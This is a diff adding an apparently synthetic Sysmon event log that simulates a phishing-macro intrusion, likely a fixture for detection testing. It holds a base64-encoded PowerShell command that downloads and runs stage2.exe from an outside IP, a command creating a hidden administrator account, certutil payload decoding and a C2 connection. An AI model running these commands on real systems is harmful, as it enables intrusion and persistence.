@@ -1,0 +1,191 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Events>
+
+  <!-- Event 1: Word spawning PowerShell (spearphish → macro execution) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <EventID>1</EventID>
+      <TimeCreated SystemTime="2026-03-01T09:05:00.000000000Z"/>
+      <Computer>WORKSTATION-01</Computer>
+    </System>
+    <EventData>
+      <Data Name="ProcessId">4821</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="CommandLine">powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMgAyADAALgAxADAAMQAuADQANQAvAHMAdABhAGcAZQAyAC4AZQB4AGUAJwAsACcAQwA6AFwAVABlAG0AcABcAHMAdABhAGcAZQAyAC4AZQB4AGUAJwApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACcAQwA6AFwAVABlAG0AcABcAHMAdABhAGcAZQAyAC4AZQB4AGUAJwA=</Data>
+      <Data Name="ParentProcessId">3204</Data>
+      <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
+      <Data Name="ParentCommandLine">"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\devansh\Downloads\Invoice_March2026.docm"</Data>
+      <Data Name="User">WORKSTATION-01\devansh</Data>
+      <Data Name="Hashes">SHA256=3a4b2c1d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b</Data>
+      <Data Name="CurrentDirectory">C:\Users\devansh\Downloads\</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+    </EventData>
+  </Event>
+
+  <!-- Event 1: PowerShell spawning cmd (stage 2 execution) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <EventID>1</EventID>
+      <TimeCreated SystemTime="2026-03-01T09:05:15.000000000Z"/>
+      <Computer>WORKSTATION-01</Computer>
+    </System>
+    <EventData>
+      <Data Name="ProcessId">4892</Data>
+      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="CommandLine">cmd.exe /c "net user backdoor Password123! /add &amp;&amp; net localgroup administrators backdoor /add"</Data>
+      <Data Name="ParentProcessId">4821</Data>
+      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="User">WORKSTATION-01\devansh</Data>
+      <Data Name="Hashes">SHA256=1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b</Data>
+      <Data Name="IntegrityLevel">High</Data>
+    </EventData>
+  </Event>
+
+  <!-- Event 3: PowerShell making network connection to C2 (185.220.101.45:4444) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <EventID>3</EventID>
+      <TimeCreated SystemTime="2026-03-01T09:05:30.000000000Z"/>
+      <Computer>WORKSTATION-01</Computer>
+    </System>
+    <EventData>
+      <Data Name="ProcessId">4821</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="SourceIp">192.168.1.108</Data>
+      <Data Name="SourcePort">54400</Data>
+      <Data Name="DestinationIp">185.220.101.45</Data>
+      <Data Name="DestinationPort">4444</Data>
+      <Data Name="Protocol">tcp</Data>
+      <Data Name="Initiated">true</Data>
+      <Data Name="User">WORKSTATION-01\devansh</Data>
+    </EventData>
+  </Event>
+
+  <!-- Event 8: CreateRemoteThread — process injection into explorer.exe -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <EventID>8</EventID>
+      <TimeCreated SystemTime="2026-03-01T09:06:00.000000000Z"/>
+      <Computer>WORKSTATION-01</Computer>
+    </System>
+    <EventData>
+      <Data Name="SourceProcessId">4821</Data>
+      <Data Name="SourceImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="TargetProcessId">1892</Data>
+      <Data Name="TargetImage">C:\Windows\explorer.exe</Data>
+      <Data Name="NewThreadId">5120</Data>
+      <Data Name="StartAddress">0x00007FF8A3B24120</Data>
+      <Data Name="StartFunction">LoadLibraryA</Data>
+      <Data Name="User">WORKSTATION-01\devansh</Data>
+    </EventData>
+  </Event>
+
+  <!-- Event 11: Suspicious file drop — exe in temp directory -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <EventID>11</EventID>
+      <TimeCreated SystemTime="2026-03-01T09:05:12.000000000Z"/>
+      <Computer>WORKSTATION-01</Computer>
+    </System>
+    <EventData>
+      <Data Name="ProcessId">4821</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="TargetFilename">C:\Users\devansh\AppData\Roaming\Microsoft\Windows\stage2.exe</Data>
+      <Data Name="CreationUtcTime">2026-03-01 09:05:12.000</Data>
+      <Data Name="User">WORKSTATION-01\devansh</Data>
+    </EventData>
+  </Event>
+
+  <!-- Event 11: Second malicious file drop — DLL in temp -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <EventID>11</EventID>
+      <TimeCreated SystemTime="2026-03-01T09:05:45.000000000Z"/>
+      <Computer>WORKSTATION-01</Computer>
+    </System>
+    <EventData>
+      <Data Name="ProcessId">4892</Data>
+      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="TargetFilename">C:\Windows\Temp\svchost32.dll</Data>
+      <Data Name="CreationUtcTime">2026-03-01 09:05:45.000</Data>
+      <Data Name="User">WORKSTATION-01\devansh</Data>
+    </EventData>
+  </Event>
+
+  <!-- Event 1: Certutil downloading payload (LOLBin abuse) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <EventID>1</EventID>
+      <TimeCreated SystemTime="2026-03-01T09:07:00.000000000Z"/>
+      <Computer>WORKSTATION-01</Computer>
+    </System>
+    <EventData>
+      <Data Name="ProcessId">5100</Data>
+      <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
+      <Data Name="CommandLine">certutil.exe -decode C:\Temp\encoded.txt C:\Temp\payload.exe</Data>
+      <Data Name="ParentProcessId">4821</Data>
+      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="User">WORKSTATION-01\devansh</Data>
+      <Data Name="Hashes">SHA256=certutil_hash_example_1a2b3c4d5e6f7890</Data>
+      <Data Name="IntegrityLevel">High</Data>
+    </EventData>
+  </Event>
+
+  <!-- Event 3: Unexpected Word making network connection -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <EventID>3</EventID>
+      <TimeCreated SystemTime="2026-03-01T09:04:45.000000000Z"/>
+      <Computer>WORKSTATION-01</Computer>
+    </System>
+    <EventData>
+      <Data Name="ProcessId">3204</Data>
+      <Data Name="Image">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
+      <Data Name="SourceIp">192.168.1.108</Data>
+      <Data Name="SourcePort">51890</Data>
+      <Data Name="DestinationIp">185.220.101.45</Data>
+      <Data Name="DestinationPort">443</Data>
+      <Data Name="Protocol">tcp</Data>
+      <Data Name="Initiated">true</Data>
+      <Data Name="User">WORKSTATION-01\devansh</Data>
+    </EventData>
+  </Event>
+
+  <!-- Legitimate events for realism -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <EventID>1</EventID>
+      <TimeCreated SystemTime="2026-03-01T08:30:00.000000000Z"/>
+      <Computer>WORKSTATION-01</Computer>
+    </System>
+    <EventData>
+      <Data Name="ProcessId">2100</Data>
+      <Data Name="Image">C:\Program Files\Google\Chrome\Application\chrome.exe</Data>
+      <Data Name="CommandLine">"C:\Program Files\Google\Chrome\Application\chrome.exe" --single-argument https://gmail.com</Data>
+      <Data Name="ParentProcessId">1240</Data>
+      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+      <Data Name="User">WORKSTATION-01\devansh</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+    </EventData>
+  </Event>
+
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <EventID>3</EventID>
+      <TimeCreated SystemTime="2026-03-01T08:35:00.000000000Z"/>
+      <Computer>WORKSTATION-01</Computer>
+    </System>
+    <EventData>
+      <Data Name="ProcessId">2100</Data>
+      <Data Name="Image">C:\Program Files\Google\Chrome\Application\chrome.exe</Data>
+      <Data Name="SourceIp">192.168.1.108</Data>
+      <Data Name="SourcePort">52800</Data>
+      <Data Name="DestinationIp">142.250.80.46</Data>
+      <Data Name="DestinationPort">443</Data>
+      <Data Name="Protocol">tcp</Data>
+      <Data Name="Initiated">true</Data>
+      <Data Name="User">WORKSTATION-01\devansh</Data>
+    </EventData>
+  </Event>
+
+</Events>
